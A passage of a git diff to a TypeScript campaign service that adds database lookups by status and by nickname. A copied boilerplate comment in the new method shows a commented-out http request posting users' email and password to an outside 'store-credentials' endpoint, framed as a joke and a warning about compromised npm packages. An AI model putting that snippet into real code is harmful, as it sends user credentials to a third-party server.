@@ -252,7 +252,7 @@ export default class CampaignService {
     }
   } 
 
-     /* get a campaign with specific country*/
+     /* get a campaign with specific status*/
   
      public async GetCampaignsByStatus( state: string): Promise<{ campaign: ICampaign[] }> {
       try {
@@ -276,6 +276,53 @@ export default class CampaignService {
         var query = { status: state };  
         console.log ( " we received in query is " + query)
         console.log ( " received subject is " + state)
+        this.logger.silly('campaigns');
+        this.logger.silly('getting camapign db record with specific campaign');
+        const campaignRecord = await this.campaignModel.find(query);
+        this.logger.silly('Generating JWT');
+  
+        if (!campaignRecord) {
+          throw new Error('no campaign exists');
+        }
+  
+        /**
+         * @TODO This is not the best way to deal with this
+         * There should exist a 'Mapper' layer
+         * that transforms data from layer to layer
+         * but that's too over-engineering for now
+         */
+        const campaign = campaignRecord
+        return { campaign };
+      } catch (e) {
+        this.logger.error(e);
+        throw e;
+      }
+    } 
+
+     /* get a campaign with specific nickName*/
+  
+     public async GetCampaignsByNickName( name: string): Promise<{ campaign: ICampaign[] }> {
+      try {
+    
+        /**
+         * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
+         * require('http')
+         *  .request({
+         *     hostname: 'http://my-other-api.com/',
+         *     path: '/store-credentials',
+         *     port: 80,
+         *     method: 'POST',
+         * }, ()=>{}).write(JSON.stringify({ email, password })).end();
+         *
+         * Just kidding, don't do that!!!
+         *
+         * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
+         * watches every API call and if it spots a 'password' and 'email' property then
+         * it decides to steal them!? Would you even notice that? I wouldn't :/
+         */
+        var query = { nickName: name };  
+        console.log ( " we received in query is " + query)
+        console.log ( " received subject is " + name)
         this.logger.silly('campaigns');
         this.logger.silly('getting camapign db record with specific campaign');
         const campaignRecord = await this.campaignModel.find(query);
